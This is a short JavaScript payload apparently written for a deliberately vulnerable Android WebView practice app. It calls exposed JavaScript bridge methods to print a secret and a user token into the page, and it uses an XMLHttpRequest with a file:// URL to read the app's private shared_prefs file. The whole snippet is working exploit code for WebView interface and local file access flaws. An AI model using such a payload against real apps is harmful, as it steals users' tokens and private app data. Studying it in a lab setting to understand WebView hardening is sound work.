document.write('<h1>'+javascriptBridge.getSecret()+'</h1>');
document.write("token: " + Android.getUserToken()); 
var url = 'file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml'; //local file 
var xhr = new XMLHttpRequest();
xhr.open('GET', url, true); 

xhr.send(''); 
